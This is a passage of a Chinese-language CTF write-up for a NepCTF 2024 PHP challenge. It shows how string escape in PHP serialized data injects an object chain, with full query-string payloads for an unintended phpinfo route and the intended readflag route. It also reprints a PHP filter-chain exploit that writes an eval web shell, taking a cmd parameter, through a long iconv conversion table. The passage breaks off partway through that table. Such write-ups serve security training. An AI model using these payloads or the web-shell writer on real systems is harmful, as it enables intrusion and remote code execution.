class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt;str;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&quot;00&quot;</span>,<span class="hljs-variable">$ser</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>类似这题其实已经是第三次了(第一次是黄河流域第二次是XGCTF),一直没仔细研究,趁着这次好好研究一下</p><p>先了解一下上方的字符串注入，这里就直接聊怎么做了，详细讲解可以去看gxngxngxn师傅的博客</p><p>%9f可以造成字符串往后移动一位，因为它不解析，%f0可以把字符串吞掉前三位</p><img src="/../../images/nepctf/2024/php1.png" alt="php1" style="zoom:80%;"><img src="/../../images/nepctf/2024/php2.png" alt="php2" style="zoom:80%;"><p>%f0配合任意的三个字符结合%9f就可以达到字符串逃逸</p><p>由此可以够造截取前面的内容，使$str=NepCTF]</p><img src="/../../images/nepctf/2024/php3.png" alt="php3" style="zoom:80%;"><p>本题存在非预期解，先了解一下</p><h3 id="非预期"><a class="markdownIt-Anchor" href="#非预期"></a> 非预期</h3><p><strong>利用phpinfo(),读取flag</strong></p><p><code>$data = str_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser);</code>根据这条，字符变多逃逸，先构造后面的序列化得到的内容是<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</code>长度共47，将\0换成00多出一个字符，总共需要47个进行逃逸构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?nep1=%f0abc%f0abc%f0abc%f0abc%9f%9f&amp;nep=Nep&amp;c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>搜索flag就可以得到了，应该是因为gzctf的特性造成非预期得到的flag</p><h3 id="预期"><a class="markdownIt-Anchor" href="#预期"></a> 预期</h3><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-variable">$exp</span>-&gt;str=<span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$exp</span>-&gt;str-&gt;b=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">new</span> A,<span class="hljs-number">1</span>=&gt;<span class="hljs-string">&#x27;readflag&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-comment">#O:1:&quot;C&quot;:2:&#123;s:1:&quot;s&quot;;s:1:&quot;a&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br><span class="hljs-comment">#字符串有不可见</span><br></code></pre></td></tr></table></figure><p>截取需要的内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>再根据这段的长度进行字符串进行逃逸，得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;a:2:&#123;i:0;O:1:&quot;</span>A<span class="hljs-string">&quot;:1:&#123;s:3:&quot;</span>key<span class="hljs-string">&quot;;S:5:&quot;</span>\<span class="hljs-number">00</span>key\<span class="hljs-number">00</span><span class="hljs-string">&quot;;&#125;i:1;s:8:&quot;</span>readflag<span class="hljs-string">&quot;;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>再配上上面那段nep组成payload，接下来分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题看了一下可以通过filter_chain进行rce写入马，然后得到flag</p><p>这里借用晨曦师傅的exp得到马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$base64_payload</span> = <span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&quot;</span>; <span class="hljs-comment">/*&lt;?php <span class="hljs-doctag">@eval</span>($_REQUEST[&#x27;cmd&#x27;]);?&gt;*/</span><br><span class="hljs-variable">$conversions</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;/&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;2&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,<br>    <span class="hljs-string">&#x27;3&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;5&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,<br><span class="hljs-string">&#x27;6&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;A&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,<br>    <span class="hljs-string">&#x27;F&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;G&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,<br>    <span class="hljs-string">&#x27;H&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;I&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;J&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;L&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,<br>    <span class="hljs-string">&#x27;M&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,<br>    <span class="hljs-string">&#x27;N&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;O&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;R&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,<br><span class="hljs-string">&#x27;S&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,<br>    <span class="hljs-string">&#x27;T&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,<br>    <span class="hljs-string">&#x27;X&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,<br><span class="hljs-string">&#x27;Z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,<br><span class="hljs-string">&#x27;j&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span> 